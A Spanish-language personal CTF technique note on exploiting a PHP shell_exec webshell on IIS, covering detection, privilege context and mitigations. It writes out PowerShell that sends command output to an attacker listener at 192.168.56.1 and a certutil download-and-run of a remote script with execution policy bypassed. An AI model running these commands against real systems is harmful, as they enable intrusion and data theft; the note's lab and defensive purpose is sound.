---
tags: [tecnica, web, php, webshell, rce, iis, shell-exec]
tipo: tecnica
categoria: web
estado: practicado
maquinas: [Welcome To The Jungle]
---

# PHP-Webshell (shell_exec en un endpoint publicado)

## 1. Qué es

Backdoor de ejecución de comandos en una aplicación **PHP servida por IIS**, normalmente de la forma:

```php
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . " 2>&1");
}
```

El comando **se ejecuta**, pero la salida puede no mostrarse nunca en la respuesta (si `$output` no se imprime), lo que obliga a **exfiltrarla por un canal externo**.

## 2. Cómo funciona

- `shell_exec` invoca `cmd.exe /c <comando>` y devuelve la salida por stdout.
- Sin `echo`/`print` de `$output`, el cliente ve una respuesta HTML **vacía** de la ejecución.
- El proceso filho hereda el token del **worker de IIS** → `IIS AppPool\<Pool>`.

## 3. Cuándo sospecharla

- Panel que acepta `POST` de un parámetro tipo `cmd`/`exec`/`shell`.
- Always: **leer el código fuente PHP**, no solo el HTML renderizado. En [[Welcome To The Jungle]] el `panel.php` renderizado solo parecía una página con un enlace de descarga.
- En un servidor IIS, el token del app pool suele traer `SeImpersonatePrivilege` → escalada directa a SYSTEM (ver [[GodPotato-SeImpersonate]]).

## 4. Cómo comprobarla (laboratorio autorizado)

```bash
# Login previo (si la app exige sesión)
curl -c c.txt -X POST http://IP/app/ -d "user=...&pass=..."
curl -b c.txt http://IP/app/panel.php | head -20
```

```powershell
# En el objetivo: exfiltrar la salida por callback HTTP al atacante
$cmd = 'cmd /c whoami'
$o   = cmd /c $cmd 2>&1 | Out-String
$b   = [Text.Encoding]::UTF8.GetBytes($o)
Invoke-WebRequest -UseBasicParsing -Method POST -Uri 'http://192.168.56.1:8000/out' -Body $b
```

```powershell
# Ejecución de un .ps1 arbitrario (subir vía certutil desde un listener propio)
certutil -urlcache -split -f http://192.168.56.1:8000/script.ps1 C:\Users\Public\s.ps1
powershell -NoProfile -ExecutionPolicy Bypass -File C:\Users\Public\s.ps1
```

## 5. Herramientas

- `curl` (POST + cookie jar), `certutil -urlcache` (descarga de ficheros sin PowerShell DownloadFile).
- Un listener HTTP propio en el atacante para exfiltrar salida y subir payloads.
- `Invoke-WebRequest` / `Invoke-RestMethod` en el objetivo.

## 6. Ejemplos en mis CTF

| Máquina | Contexto | Resultado |
|---|---|---|
| [[Welcome To The Jungle]] | `panel.php` en `/theh3xgun5/` → shell_exec → `IIS AppPool\DefaultAppPool` → `GodPotato` | root flag como SYSTEM |

## 7. Falsos positivos / pruebas fallidas

- `shell_exec` **sin imprimir la salida** ⇒ el POST devuelve 200 y el HTML de siempre: no significa que el comando **no** se ejecutó (¡error clásico!). Verificar con un side-effect (fichero) o con el callback.
- Redirecciones `> fichero` en rutas no escribibles (p. ej. `C:\Windows\Temp` con ACL restrictiva) fallan en silencio → usar una ruta con permisos de escritura (`C:\Users\Public`).
- El token del app pool **ve más que un usuario de escritorio**: con él se listan tareas y servicios que a un usuario normal le son negados. Aprovecharlo para enumerar.

## 8. Prevención y mitigación

- **Prohibir `shell_exec`, `system`, `passthru`, `popen`, `proc_open`, `eval`, `assert` y `create_function`** en código publicado. Barrido automático del árbol web.
- Ejecutar PHP con un usuario de servicio de privilegio mínimo, sin `SeImpersonatePrivilege`.
- Deshabilitar funciones peligrosas en `php.ini` (`disable_functions`) como barrera adicional.
- Registrar y alertar de peticiones con parámetros `cmd`/`exec` hacia ficheros PHP.
- Vigilar procesos hijos de `w3wp.exe` que no sean el propio worker de PHP.

## 9. Técnicas relacionadas

- [[GodPotato-SeImpersonate]]
- [[Command-Injection]]
- [[Esteganografia-WAV-LSB]]
